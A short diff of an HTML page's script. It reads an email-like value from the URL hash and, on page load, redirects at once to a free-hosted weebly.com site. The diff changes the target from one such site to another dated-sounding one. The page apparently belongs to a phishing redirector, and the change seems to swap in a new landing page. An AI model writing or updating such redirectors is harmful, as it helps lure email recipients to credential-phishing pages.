@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://als-worldwide.weebly.com";
+			window.location.href = "https://february2023.weebly.com/";
 		}, 0);
 	</script>
 </html>
